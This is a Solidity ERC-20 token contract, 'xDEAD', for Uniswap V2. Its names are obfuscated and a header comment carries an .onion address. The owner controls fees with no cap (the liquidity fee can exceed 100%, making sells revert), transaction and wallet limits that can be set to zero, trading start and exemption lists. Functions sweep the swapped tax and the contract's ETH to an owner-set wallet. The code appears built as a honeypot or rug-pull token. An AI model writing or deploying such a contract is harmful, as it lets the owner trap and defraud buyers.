// SPDX-License-Identifier: DEAD
//2lx54bwauis6j4jp3elc3df5ozshgdxvgmhooevfgn5uqfya4iskngad.onion
pragma solidity ^0.8.0;

import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';


contract xDEAD is ERC20, Ownable {
    address private constant DEADDEADDEADDEADDEADDEAD = address(0xdead);
    IUniswapV2Router02 public sPOOOA;
    address public noHoPE;
    address private chASeMe;
    address private plssss;
    bool private THEYNEVERKNOW;
    uint256 public NEVEREND = 5;
    uint256 public STOPIT = 0;
    uint256 public SEL = 5;
    uint256 public BURN = 0;
    bool public WE = true;
    uint256 public NEED = 1;
    uint256 public TO = 1;
    mapping(address => bool) private WAKE;
    mapping(address => bool) private UP;
    uint256 public WHEN;
    uint256 private WILL = 25;
    bool private IT = true;
    bool private HAPPEN = false;

    modifier LC() {HAPPEN = true; _; HAPPEN = false;}

    constructor()  ERC20('xDEAD', 'xDEAD') {
        sPOOOA = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        noHoPE = IUniswapV2Factory(sPOOOA.factory()).createPair(address(this), sPOOOA.WETH());
        chASeMe = owner(); plssss = owner();
        UP[address(this)] = true; UP[msg.sender] = true; WAKE[address(this)] = true; WAKE[msg.sender] = true;
        _mint(owner(), 1_703_697_1776 * 10 ** 18);
    }

    function DEADDEAD() external onlyOwner {WHEN = block.timestamp;}

    function _transfer(
        address deathaaa,
        address aaadeadddd,
        uint256 dededead
    ) internal virtual override {
        DDDDEADDEADDEADDEADDDDDDD(deathaaa, aaadeadddd, dededead);
        pYXME(deathaaa, aaadeadddd, dededead);
        DEADDEADDEAD(deathaaa, aaadeadddd, dededead);
    }

    function DEADDEADDEAD(
        address death,
        address rdeededeath,
        uint256 dededeajy
    ) private {
        bool bbbdead = death == noHoPE && rdeededeath != address(sPOOOA);
        bool sssdead = rdeededeath == noHoPE;
        bool sdead = bbbdead || sssdead;

        uint256 tdeeead = 0;
        if (WHEN != 0 && sdead && !THEYNEVERKNOW && !(UP[death] || UP[rdeededeath])) {
            tdeeead = (dededeajy * FDFSPDEADKSDFH(sssdead)) / 100;
            if (tdeeead > 0) {
                super._transfer(death, address(this), tdeeead);
            }
        }
        super._transfer(death, rdeededeath, dededeajy - tdeeead);
    }

    function DDDDEADDEADDEADDEADDDDDDD(
        address SPPPSP,
        address GGSGSG,
        uint256 APPP
    ) private {
        if (WHEN == 0) {require(UP[SPPPSP] || UP[GGSGSG]);}
        bool bbbdead = SPPPSP == noHoPE && GGSGSG != address(sPOOOA);
        bool sssdead = GGSGSG == noHoPE;
        bool sdead = bbbdead || sssdead;
        if (sdead && WE) {uint256 mmdead = totalSupply() * TO / 100;
            require(mmdead >= APPP || WAKE[GGSGSG] || WAKE[SPPPSP]);
                if (bbbdead) {uint256 mxdead = totalSupply() * NEED / 100;
                    require(mxdead >= balanceOf(GGSGSG) + APPP || WAKE[GGSGSG] || WAKE[SPPPSP]);
                }
            }
    }



    function pYXME(
        address ssssdeeead,
        address rereredead,
        uint256 ddddd
    ) private {
        bool ssssdead = rereredead == noHoPE;

        uint256 mdddeeeead = (balanceOf(noHoPE) * WILL) / 10000;
        uint256 bbhbhdead = balanceOf(address(this));
        bool gfgfgfdeaddfdf = bbhbhdead >= mdddeeeead;

        bool isOwner = ssssdeeead == owner() || rereredead == owner();
        if (IT && !HAPPEN && !isOwner && gfgfgfdeaddfdf && WHEN != 0 && ssssdead) {
            DEADDEADDEADDEADDDDD(mdddeeeead);
        }
    }

    function DEADDEADDEADDEADDDDD(uint256 death) private LC {
        uint256 bdeededead = address(this).balance;
        uint256 llldead = (death * STOPIT) / FDFSPDEADKSDFH(true) / 2;
        uint256 bdeeeead = (death * BURN) / FDFSPDEADKSDFH(true) / 2;
        pYXME(death - llldead - bdeeeead);
        uint256 bdddededeeeeeead = address(this).balance - bdeededead;
        if (bdddededeeeeeead > 0) {DDDDEADDEADDEADDEADDDDD(bdddededeeeeeead, llldead);}
        if (bdeeeead > 0) {super._transfer(address(this), DEADDEADDEADDEADDEADDEAD, bdeeeead);}
    }

    function pYXME(uint256 death) private {
        address[] memory path = new address[](2); path[0] = address(this); path[1] = sPOOOA.WETH();
        _approve(address(this), address(sPOOOA), death);
        sPOOOA.swapExactTokensForETHSupportingFeeOnTransferTokens(death, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}

    function DDDDEADDEADDEADDEADDDDD(uint256 eeegrgededead, uint256 aamamsdEAD) private {
        uint256 lEEDEAD = (eeegrgededead * STOPIT) / FDFSPDEADKSDFH(true);
        if (aamamsdEAD > 0) {
            dfadeadaaa(aamamsdEAD, lEEDEAD);
        }
        payable(chASeMe).transfer(address(this).balance);
    }


    function dfadeadaaa(uint256 TAATAT, uint256 FAFA) private {
        _approve(address(this), address(sPOOOA), TAATAT);
        sPOOOA.addLiquidityETH{value : FAFA}(address(this), TAATAT, 0, 0, plssss, block.timestamp);
    }

    function FDFSPDEADKSDFH(bool death) private returns (uint256) {if (death) {return STOPIT + SEL + BURN;} else {return STOPIT + NEVEREND + BURN;}}

    function BNBNBNBDEADNBNBNBN(uint256 death) external onlyOwner {require(death <= 40); SEL = death;}

    function UIFDOIDEADUIUI(uint256 death) external onlyOwner {require(death <= 10); BURN = death;}

    function ALFISDEADLKFSL(uint256 death) external onlyOwner {STOPIT = death;}

    function UOIUIOIDEADFDKD(uint256 death) external onlyOwner {NEED = death;}

    function YUIUUSUSIDEADFSF(uint256 death) external onlyOwner {TO = death;}

    function RYUHGHDEADYTYU(bool death) external onlyOwner {WE = death;}

    function OOPOOPDEADPOIO(uint256 death) external onlyOwner {require(death <= 10); NEVEREND = death;}

    function NMBMDEADBMN(uint256 death) external onlyOwner {require(death <= 10); WILL = death;}

    function NODEADOO(address VVCCCCC, bool GddJKJK) external onlyOwner {UP[VVCCCCC] = GddJKJK;}

    function EQDEADEQE(bool GDGDGDGDG) external onlyOwner {IT = GDGDGDGDG;}

    function FSOOODEADSOSO(bool AAFAFAF) external onlyOwner {THEYNEVERKNOW = AAFAFAF;}

    function setDEADMe(address GDGDGDG) external onlyOwner {chASeMe = GDGDGDG;}

    function GLPPDEADS(address DFDSFDF) external onlyOwner {plssss = DFDSFDF;}

    function GSDDGDEADGSF() external LC onlyOwner {pYXME(balanceOf(address(this))); (bool weAreNotAlone,) = address(chASeMe).call{value : address(this).balance}("");}

    function GDDGDEADGDFD() external onlyOwner {(bool weAreNotAlone,) = address(chASeMe).call{value : address(this).balance}("");}
}